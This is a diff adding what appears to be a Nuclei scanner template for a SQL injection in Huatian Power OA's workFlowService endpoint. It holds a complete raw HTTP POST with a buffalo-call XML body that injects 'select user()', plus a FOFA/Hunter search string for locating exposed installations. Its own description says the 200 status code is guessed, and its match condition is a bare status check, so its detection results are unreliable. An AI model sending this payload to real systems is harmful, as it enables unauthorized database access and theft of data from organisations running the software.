@@ -1,0 +1,48 @@
+id: poc-86bd90eea98e161859ba
+info:
+  name: 华天动力OAworkFlowServiceSQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/86bd90eea98e161859baee46468c0c3b
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 86bd90eea98e161859baee46468c0c3b
+    fofa: + hunter`app.name="华天软件 OA"`
+http:
+- raw:
+  - 'POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+    AAccept-Encoding: identity
+
+    Content-Length: 103
+
+    Accept-Language: zh-CN,zh;q=0.8
+
+    Accept: */*
+
+    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+
+    Connection: keep-alive
+
+    Cache-Control: max-age=0
+
+
+    <buffalo-call>
+
+    <method>getDataListForTree</method>
+
+    <string>select user()</string>
+
+    </buffalo-call>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
